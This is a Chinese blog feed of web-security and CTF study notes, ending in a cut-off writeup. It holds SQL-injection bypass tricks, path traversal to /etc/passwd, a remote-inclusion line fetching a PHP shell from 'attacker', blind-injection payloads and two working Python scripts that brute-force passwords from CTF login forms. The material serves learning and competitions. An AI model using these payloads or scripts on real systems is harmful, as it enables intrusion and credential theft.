<h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>尝试宽字节    %bf%27 %df%27 %aa%27</p>
<h3 id="利用等价函数"><a href="#利用等价函数" class="headerlink" title="利用等价函数"></a>利用等价函数</h3><ul>
<li>hex()、bin() ==&gt; ascii()</li>
<li>sleep() ==&gt; benchmark()</li>
<li>concat_ws()==&gt; group_concat()</li>
<li>mid()、substr() ==&gt; substring()</li>
<li>@@user ==&gt; user()</li>
<li>@@datadir ==&gt; datadir()</li>
</ul>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>随便提几个基础的：</p>
<ul>
<li>文件名限制      1.php.jpeg 可以在服务端使用php格式打开执行</li>
<li>文件类型限制     burpsuite 修改image/jpeg</li>
<li>文件大小限制     修改信息文件限制大小参数</li>
<li>文件内容头部     修改文件内容头部<br>高端的，直接上<a href="http://blog.0kami.cn/2016/07/04/file-upload-vulnerability/" target="_blank" rel="external">0kami的博客</a> </li>
</ul>
<h2 id="文件包含及目录遍历"><a href="#文件包含及目录遍历" class="headerlink" title="文件包含及目录遍历"></a>文件包含及目录遍历</h2><p>两者应用相似，唯一不同就在于：前者是在url的<strong>参数</strong>中，后者是直接在url上</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>– 0字节 \x00<br>(magic_quotes_gpc=off PHP小于5.3.4)<br><code>../../../../../../etc/passwd%00</code></p>
<h3 id="长目录截断"><a href="#长目录截断" class="headerlink" title="长目录截断"></a>长目录截断</h3><p>利用操作系统对目录最大长度的限制<br>(php版本小于5.2.8(?) linux&gt;4096 windows&gt;256)<br><code>././././././././././././././././passwd</code><br><code>////////////////////////passwd</code></p>
<h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>(php版本小于5.2.8(?) 只适用windows 最后点号&gt;256)<br><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p>
<h3 id="远程文件包含中的"><a href="#远程文件包含中的" class="headerlink" title="远程文件包含中的?"></a>远程文件包含中的<strong>?</strong></h3><p>远程文件包含本身参数传递的就是url地址，末尾加个<strong>？</strong>会把之后的系统后台添加的字符串理解为无用参数<br><code>/?param=http://attacker/phpshell.txt?</code><br><code>require_once &#39;http://attacker/phpshell.txt?/action/m_share.php&#39;;</code></p>
<p>以上偷取葛大佬的部分栗子</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的sql盲注]]></title>
      <url>/2017/09/24/WEB-CTF%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8/</url>
      <content type="html"><![CDATA[<p>—从零开始的笔记—<br>—requests和脚本—<br><a id="more"></a></p>
<hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此篇包括sql盲注，以及调用requests库的基本python脚本编写</p>
<h2 id="sql盲注的原理"><a href="#sql盲注的原理" class="headerlink" title="sql盲注的原理"></a>sql盲注的原理</h2><p>上篇也大致提了一下sql盲注，以及分为<strong>布尔型盲注</strong>,<strong>时间型盲注</strong>。<br>实际上sql盲注也很简单，其实就是不直接显示搜索到的结果，而从其他方式来推断得出结果的sql注入。<br>举起个小栗子：</p>
<ul>
<li><strong>sql回显注入</strong> ：<br>  我问你叫什么名字，你回答你叫奥特曼。</li>
<li><strong>sql布尔型盲注</strong> ：<br>  我问你叫什么名字，你只会说是和不是(ture false)。<br>  于是就，我问你叫不叫李狗蛋呀，不是。叫不叫王大花呀，不是。一直猜到是为止。<br>  但是猜也讲究技巧，一个字一个字的猜的效率比一起猜三个字效率不知道高几倍。</li>
<li><strong>sql时间型盲注</strong> ：<br>  我问你叫什么名字，无论对错，你只会 啊 的叫一声。<br>  于是就，是 = 让你立马啊，不是 = 让你过一会再啊，以此区分，就便成布尔型一样了。</li>
</ul>
<p>再类比成数据库查询，原理就是如此了。</p>
<h2 id="数据库盲注所用的函数"><a href="#数据库盲注所用的函数" class="headerlink" title="数据库盲注所用的函数"></a>数据库盲注所用的函数</h2><ul>
<li><a href="http://outofmemory.cn/code-snippet/1149/MySQL-if-case-statement-usage-summary" target="_blank" rel="external">if 和 case</a> 用于时间型盲注</li>
<li><a href="http://www.jb51.net/article/27458.htm" target="_blank" rel="external">substring()</a> 用于截断字符串</li>
<li><a href="http://www.bkjia.com/Mysql/625204.html" target="_blank" rel="external">ascii（）</a> 使字符变成ascii码（可以ascii码比较，也可直接字符比较）</li>
<li><a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset 与 limit</a> 用于查询到多条记录时选取第几条，再猜取内容，不然只会猜取第一条</li>
</ul>
<h2 id="sql盲注的步骤"><a href="#sql盲注的步骤" class="headerlink" title="sql盲注的步骤"></a>sql盲注的步骤</h2><h3 id="1-判断是否有盲注点"><a href="#1-判断是否有盲注点" class="headerlink" title="1.判断是否有盲注点"></a>1.判断是否有盲注点</h3><p><strong>布尔型盲注</strong>：布尔型盲注的注入点的表现并不绝对统一，只要当sql语句执行成功和失败的返回的页面存在某种固定差异，即存在布尔型盲注点。<br>所以可以尝试但不限于以下的语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>1    (前后闭合’‘，此处应该返回<span class="literal">true</span>的页面，即与<span class="variable">$name</span>=1一样)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>2    (前后闭合’‘, 此处应该返回<span class="literal">false</span>的信息，即与<span class="variable">$name</span>=1不同)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' or '</span>1<span class="string">' = '</span>1    (前后闭合’‘，此处应该返回<span class="literal">true</span>的页面，即与<span class="variable">$name</span>=1一样)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' or '</span>1<span class="string">' = '</span>2    (前后闭合’‘, 此处应该返回<span class="literal">false</span>的信息，即与<span class="variable">$name</span>=1不同)</div><div class="line"></div><div class="line">全句：select 列 from 表 <span class="built_in">where</span> name = <span class="string">'1'</span> and <span class="string">'1'</span>=<span class="string">'1'</span></div></pre></td></tr></table></figure>
<p><strong>时间型盲注</strong>:基于布尔型的语句上，利用if或case加以区分使返回结果有区别<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>= <span class="string">' or if('</span>1<span class="string">' = '</span>1<span class="string">',sleep(5),1) --+   (延迟返回为true)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">$name= '</span> or <span class="keyword">if</span>（<span class="string">'1'</span> = <span class="string">'2'</span>,sleep(5),1) --+  (不延迟返回为<span class="literal">false</span>，因为正确的概率低，节省时间)</div><div class="line"></div><div class="line">全句：select 列 from 表 <span class="built_in">where</span> name = <span class="string">''</span> or <span class="keyword">if</span>(<span class="string">'1'</span> = <span class="string">'1'</span>,sleep(5),1) --+</div></pre></td></tr></table></figure></p>
<p>此处跟布尔型<strong>and</strong>和<strong>or</strong>的使用故意有所区分。<br>实际情况中当你构造不出一个数据库中有的name时，如果继续使用<code>$name= &#39; and if（&#39;1&#39; = &#39;1&#39;,sleep(5),1) --+</code></p>
<p><code>$name=&#39;&#39;</code> 语句执行已经为false，根据<strong>and的就近原则</strong>：当前有false时，不执行之后的句子<br>结果将永远不延迟。</p>
<p>于是就可以用<code>&#39; or if（&#39;1&#39; = &#39;1&#39;,sleep(5),1) --+</code></p>
<hr>
<p>接下来<br>一般跳过<strong>判断select语句有几列</strong>，<strong>判断显示的信息在第几列</strong>环节，<br>因为盲注一般不用union select查询，并且没有显示信息。</p>
<h3 id="2-利用函数来搜集信息"><a href="#2-利用函数来搜集信息" class="headerlink" title="2.利用函数来搜集信息"></a>2.利用函数来搜集信息</h3><p>用户：user()<br>当前数据库：database()<br>数据库版本：version()<br>@@hostname （用户）<br>@@datadir   (数据库在文件的位置)<br>@@version  （版本)<br>@@version_compile_OS  (操作系统版本)</p>
<p><strong>布尔型:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' or select substring(user(),1,1) ='</span>r<span class="string">' --+  #截取第一位开始的一个</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全局：select 2列 from 表 where name = '</span><span class="string">' or select substring(user(),1,1) ='</span>r<span class="string">' --+'</span></div></pre></td></tr></table></figure></p>
<p>盲注查询的基本套路：截取，是否相等，相等=ture页面，不相等=false页面<br>替换r，直到ture页面<br>再substring( 巴拉巴拉 , 2 , 1 ),如此反复</p>
<p><strong>时间型:</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' or  if( (select substring( user(),1,1 )='</span>r<span class="string">'),sleep(0.5),1) --+   #截取第一位开始的一个 </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全局：select 2列 from 表 where name = '</span><span class="string">' or  if( (select substring( user(),1,1 )='</span>r<span class="string">'),sleep(0.5),1) --+'</span></div></pre></td></tr></table></figure>
<p><strong>此处说明sleep（0.5）</strong>：说是睡0.5秒实际上是 表中除了name=’’以外的记录数×0.5秒</p>
<p>此句中的sleep()语句会跟 or还是and 以及 select主句中查询的记录数 有关。<br>具体情况自己可以在mysql中试验。</p>
<p>实际操作中写的数值大就好，因为我们会根据timeout时间超时来判断，超时–&gt;正确；不超时–&gt;错误。</p>
<h3 id="3-猜解库，表，列"><a href="#3-猜解库，表，列" class="headerlink" title="3.猜解库，表，列"></a>3.猜解库，表，列</h3><p><strong>布尔型</strong>：用字典文件替换db,table,column,如果不存在，返回false界面；存在，返回true界面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and column is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span><span class="string">' and column is not null -- '</span></div><div class="line"></div><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and table.user is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name='</span> and db.table.user is not null --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=<span class="string">' and (select count(*) from table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> and (select count(*) from db.table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</div></pre></td></tr></table></figure></p>
<p><strong>时间型</strong>：用字典文件替换db,table,column,如果不存在，立即返回；存在，超时。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (column is not null),sleep(5),1) --+  </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span>1<span class="string">' and if( (column is not null),sleep(0.5)&amp;1,1) -- '</span></div><div class="line"></div><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (table.column is not null),sleep(5),1) --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (db.table.column is not null),sleep(5),1) --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select count(*) from table)&gt;0 ,sleep(5),1)--+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> and <span class="keyword">if</span>( (select count(*) from db.table)&gt;0 ,sleep(5),1) --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</div></pre></td></tr></table></figure>
<h3 id="4-从information-schema中读取列，表，库"><a href="#4-从information-schema中读取列，表，库" class="headerlink" title="4.从information_schema中读取列，表，库"></a>4.从information_schema中读取列，表，库</h3><p>如果有访问information_schema的权限，当然可以从中读取。<br>此处列出时间型的小栗子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">1.读取列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(column_name,1,1) from information_schema.columns limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">2.读取表名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (select substring(table_name,1,1) from information_schema.tables  <span class="built_in">limit</span> 1 offset 0 )=<span class="string">'A'</span> ,sleep(5),1)--+  </div><div class="line"></div><div class="line">3.读取库名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(table_schema,1,1) from information_schema.tables group by table_schema limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">4.读取表的库名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (select substring(table_schuma,1,1) from information_schema.tables <span class="built_in">where</span> table_name=<span class="string">'XXXX'</span>  <span class="built_in">limit</span> 1 offset 0 )=<span class="string">'A'</span> ,sleep(5),1)--+  </div><div class="line"></div><div class="line">5.读取列的库名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(table_name,1,1) from information_schema.columns where column_name='</span>XXXX<span class="string">'  limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div></pre></td></tr></table></figure></p>
<p>布尔型的就以此类推，不再写了吧。</p>
<h3 id="5-猜解FLAG"><a href="#5-猜解FLAG" class="headerlink" title="5.猜解FLAG"></a>5.猜解FLAG</h3><p>可用select：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' union select  ascii(substring(flag,1,1)) from flag ='</span>102    ------&gt;ascii匹配</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' union select  substring(flag,1,1) from flag ='</span>A<span class="string">'            ------&gt;字符匹配</span></div></pre></td></tr></table></figure></p>
<p>不好select的情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' or column = '</span>admin  -----&gt; 内容精准</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' or column like '</span>%a%  -----&gt;  模糊查找</div></pre></td></tr></table></figure></p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>给出个说明较好的盲注实例 <a href="http://blog.csdn.net/pygain/article/details/53086389" target="_blank" rel="external">戳这里=w=</a></p>
<h2 id="requests与脚本"><a href="#requests与脚本" class="headerlink" title="requests与脚本"></a>requests与脚本</h2><p>盲注的手动注入不现实，burpsuite也不是很方便，学习用py脚本来盲注。<br>需要requests库，<a href="docs.python-requests.org/zh_CN/latest/user/quickstart.html">使用说明</a>。<br>贴上两道题目的解题的代码，加上注释，看着学习把。(题目访问url)</p>
<h3 id="布尔型脚本"><a href="#布尔型脚本" class="headerlink" title="布尔型脚本"></a>布尔型脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url=<span class="string">"http://58.154.33.13:8002/login.php"</span></div><div class="line"></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null"</span>  <span class="comment">#替换column  得到 password</span></div><div class="line"><span class="comment">#判断表</span></div><div class="line">sql_table=<span class="string">"admin' and (select password from table)&gt;0"</span>  <span class="comment">#替换table 得到 admin</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin'and (select substring(password,%s,1) from admin)='%s' #"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:sql %(i,x),<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</div><div class="line">	response=requests.post(url,data=data)</div><div class="line">	<span class="keyword">if</span> response.content.decode(<span class="string">'utf-8'</span>).find(<span class="string">'密码错误'</span>)&gt;<span class="number">0</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payloads:</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += x</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
<h3 id="时间型脚本"><a href="#时间型脚本" class="headerlink" title="时间型脚本"></a>时间型脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/5/index.php"</span></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"><span class="comment">#判断列    通过 错误 以及  返回固定页面（正确）   ------&gt; user pw</span></div><div class="line">sql_column=<span class="string">"' or  column is not null"</span></div><div class="line"><span class="comment">#判断表    通过 错误 以及  返回固定页面（正确）   ------&gt;  php</span></div><div class="line">sql_table=<span class="string">"' or select pw from table"</span></div><div class="line"><span class="comment">#判断数据</span></div><div class="line">sql_data=<span class="string">"' or if(substring((select pw from php limit 1),%d,1)=%s,sleep(5),0) #"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'user'</span>:sql_data %(i,x),<span class="string">'pass'</span>:<span class="string">'123'</span>&#125;</div><div class="line">	starttime=time.time()</div><div class="line">	s=requests.post(url,data=data)</div><div class="line">	<span class="keyword">if</span> time.time()-starttime &gt;<span class="number">5</span> :    <span class="comment">#post下 尝试用timeout参数失败，于是改用此方法来判定超时</span></div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payloads:</div><div class="line">		<span class="comment">#print(i,x)</span></div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += x</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ZJGSCTF_writeup]]></title>
      <url>/2017/09/18/ZJGSCTF_writeup/</url>
      <content type="html"><![CDATA[<p>——<a href="http://121.42.189.18" target="_blank" rel="external">ZJGSCTF</a>——-<br>——持续更新中——-<br><a id="more"></a></p>
<h2 id="9-7-综合题"><a href="#9-7-综合题" class="headerlink" title="[9-7]综合题"></a>[9-7]综合题</h2><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：编码及Linux"><a href="#涉及范围：编码及Linux" class="headerlink" title="涉及范围：编码及Linux"></a>涉及范围：编码及Linux</h3><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjrdknuoc8j30ld08haaa.jpg" alt="9-7.1"></p>
<p>页面乱码，猜测是一种编码方式，由 [ ] ! + ( ) { } 组成<br>参考 <a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="external">编码与加密</a><br>得出是jsfuck编码，百度 <a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="external">在线解码</a><br>解码得出：1bc29b36f623ba82aaf6724fd3b16718.php<br>原地址去掉index.php，加上1bc29b36f623ba82aaf6724fd3b16718.php，访问</p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrdl9bvqvj30pr0453yf.jpg" alt="9-7.2"></p>
<p>脑袋,猜测地址1bc29b36f623ba82aaf6724fd3b16718.php的前部分32位为MD5编码<br>对其试解码得：MD5<br>考虑原地址b0b0ad119f425408fc3d45253137d33d为MD5解码，解码失败。<br>再进行了访问MD5.php等方法，无果，有点无从下手。<br>退档重新思考，再看提示，发现掉坑里，tip在我脑袋里应该是指包的头部，burpsuite抓包发现<strong>tip</strong></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjrdljievpj30dd03fwei.jpg" alt="9.7.3"></p>
<p>百度 <a href="http://blog.csdn.net/chinalinuxzend/article/details/1849419" target="_blank" rel="external">history of bash</a><br>于是访问 <strong>./.bash_history</strong></p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjrdlsuefkj30640110fx.jpg" alt="9-7.4"></p>
<p>有过一次压缩文件命令，访问 <strong>./flagbak.zip</strong><br>下载解压，得到flag</p>
<h2 id="8-31-水能载舟亦可赛艇"><a href="#8-31-水能载舟亦可赛艇" class="headerlink" title="[8-31]水能载舟亦可赛艇"></a>[8-31]水能载舟亦可赛艇</h2><p><a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围-php源码，sql注入"><a href="#涉及范围-php源码，sql注入" class="headerlink" title="涉及范围:php源码，sql注入"></a>涉及范围:php源码，sql注入</h3><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjreabq0woj307m03e3ya.jpg" alt="1"></p>
<p>看到页面,好像典型的sql注入，但是web日常先看源码</p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjreau9f4pj30800100l8.jpg" alt="2"></p>
<p>好像有点提示，尝试去url访问source.txt,得到源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]) || !isset(<span class="variable">$_POST</span>[<span class="string">'pwd'</span>])) &#123;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    die;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">function</span> AttackFilter(<span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span>)&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$StrValue</span>))&#123;</div><div class="line">        <span class="variable">$StrValue</span>=implode(<span class="variable">$StrValue</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.<span class="variable">$ArrReq</span>.<span class="string">"/is"</span>,<span class="variable">$StrValue</span>)==1)&#123;   </div><div class="line">        <span class="built_in">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</div><div class="line">        <span class="built_in">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$filter</span> = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </div><div class="line">    AttackFilter(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</div><div class="line">	die(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line"><span class="variable">$db</span>=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db(<span class="variable">$db</span>, <span class="variable">$con</span>);</div><div class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</div><div 